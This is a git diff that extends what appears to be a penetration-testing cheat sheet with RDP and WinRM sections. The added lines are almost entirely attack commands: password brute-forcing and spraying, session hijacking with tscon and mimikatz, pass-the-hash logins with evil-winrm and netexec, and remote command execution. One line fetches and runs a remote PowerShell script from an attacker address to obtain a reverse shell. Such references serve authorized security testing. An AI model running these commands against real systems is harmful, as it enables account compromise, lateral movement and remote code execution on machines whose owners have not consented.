@@ -1084,21 +1084,199 @@ python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --p
 <summary>RDP (3389)</summary>
 <p></p>
 
+## Enumeration
 ```bash
-#Password spraying
+nmap --script rdp-enum-encryption -p 3389 <target-ip>
+nmap --script rdp-ntlm-info -p 3389 <target-ip>
+nmap --script rdp* -p 3389 <target-ip>
+```
+
+
+## Bruteforce (can lock accounts)
+```bash
+# Hydra
+hydra -l username -P passwords.txt <target-ip> rdp
+hydra -L usernames.txt -p password <target-ip> rdp
+
+# Crowbar https://github.com/galkan/crowbar
+crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+
+#Password spraying via RDPassSpray
 git clone https://github.com/xFreed0m/RDPassSpray
 #Options:
 RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]
 #Usage:
 python3 RDPassSpray.py -U users.txt -p Spring2025! -t 10.100.10.240:3389
+
+# impacket-red_check - if some credentials are valid for a RDP service:
+rdp_check <domain>/<name>:<password>@<IP>
+```
+
+## Connect
+```bash
+# -------------------remmina-------------------
+# -c: Connect given URI or file
+remmina -c rdp://username@vulnerable.com
+remmina -c rdp://domain\\username@vulnerable.com
+remmina -c rdp://username:password@vulnerable.com
+# Settings
+# Keyboard mapping
+1. On Remmina client window, click menu icon and move to "Preferences".
+2. Navigate to "RDP" tab and check "Use client keyboard mapping".
+3. Reboot Remmina
+
+# -------------------FreeRDP-------------------
+xfreerdp /u:username /v:10.0.0.1:3389
+xfreerdp /u:username /p:password /cert:ignore /v:10.0.0.1 /workarea
+# Create a shared drive (/drive:LOCAL_DIR,SHARE_NAME)
+xfreerdp /u:username /p:password /drive:.,share /v:10.0.0.1
+# Useful command for exploiting
+xfreerdp /v:10.0.0.1 /u:username /p:password +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+# On remote Windows
+# Access share directory in Command Prompt or PowerShell
+\\tsclient\\~share\
+
+# -------------------Rdesktop-------------------
+rdesktop -u username -p password 10.0.0.1:3389
+```
+
+## Session Stealing
+```bash
+# Get openned sessions:
+query user
+# Access to the selected session
+tscon <ID> /dest:<SESSIONNAME>
+
+# Using mimikatz
+ts::sessions        #Get sessions
+ts::remote /id:2    #Connect to the session
+
+# Try combine with https://github.com/linuz/Sticky-Keys-Slayer
+```
+
+## Adding user to RDP Group
+```powershell
+net localgroup "Remote Desktop Users" UserLoginName /add
+```
+
+## Post Exploitation
+```bash
+# AutoRDPwn
+# https://github.com/JoelGMSec/AutoRDPwn
+# AutoRDPwn is a post-exploitation framework created in Powershell, designed primarily to automate the Shadow attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to view his victim's desktop without his consent, and even control it on demand, using tools native to the operating system itself.
+
+# evilrdp
+# https://github.com/skelsec/evilrdp
+# - Control mouse and keyboard in an automated way from command line
+# - Control clipboard in an automated way from command line
+# - Spawn a SOCKS proxy from the client that channels network communication to the target via RDP
+# - Execute arbitrary SHELL and PowerShell commands on the target without uploading files
+# - Upload and download files to/from the target even when file transfers are disabled on the target
 ```
 </details>
+
+
+<!-- ------------------------------------------------WinRM NOTES----------------------------------------------------------- -->
+
 
 <details markdown="1">
 <summary>WinRM (5985/5986)</summary>
 
+## Bruteforce
 ```bash
+# netexec
+netexec winrm <target-ip> -d DOMAIN -u usernames.txt -p passwords.txt 
 
+# Metasploit
+msfconsole
+msf > use auxiliary/scanner/winrm/winrm_login
+```
+
+## Connect
+```bash
+# Evil-WinRm
+evil-winrm -i <target-ip> -u username -p password
+# -P: Specifify port
+evil-winrm -i <target-ip> -P 5986 -u username -p password
+# Pass The Hash (-H)
+evil-winrm -i <target-ip> -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc
+# PowerShell Local Path (-s)
+evil-winrm -i <target-ip> -u username -p password -s /opt/scripts
+# SSL enabled (-S)
+evil-winrm -i <target-ip> -u username -p password -S
+# If you have private key and public key
+evil-winrm -i <target-ip> -S -k private.key -c public.key
+# -S: SSL
+# -k: private key
+# -c: public key
+
+# Evil-WinRM commands
+# Upload a local file to Windows machine
+PS> upload ./example.bat c:\\Users\Administrator\Desktop\exploit.bat
+# Download a file to local
+PS> download c:\\Users\Administrator\Desktop\example.txt ./example.txt
+# List all services
+PS> services
+```
+
+## Initiating WinRM Session
+```bash
+Enable-PSRemoting -Force
+Set-Item wsman:\localhost\client\trustedhosts *
+# Activate Remotely
+wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
+# Forcing WinRM Open
+.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
+```
+
+## Command Execution
+```bash 
+# With NetExec
+# -x: Execute a command
+netexec winrm <target-ip> -d DOMAIN -u username -p password -x 'whoami'
+netexec winrm <target-ip> -d DOMAIN -u username -p password -X '$PSVersionTable'
+# -H: Login with Pass The Hash
+netexec winrm <target-ip> -d DOMAIN -u username -H <HASH> -x 'whoami'
+
+# With PowerShell
+Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
+Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
+# Execute Script
+Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
+# Get Reverse Shell
+Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
+
+# Get PS Session
+#If you need to use different creds
+$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
+## Note the ".\" in the suername to indicate it's a local user (host domain)
+$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)
+# Enter
+Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
+## Bypass proxy
+Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
+# Save session in var
+$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
+Enter-PSSession $sess
+## Background current PS session
+Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
+```
+
+## WinRM in Linux
+```bash
+# Bruteforce
+crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
+#Just check a pair of credentials
+# Username + Password + CMD command execution
+crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
+# Username + Hash + PS command execution
+crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
+#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
+
+# PS-docker machine
+docker run -it quickbreach/powershell-ntlm
+$creds = Get-Credential
+Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
 ```
 </details>
 
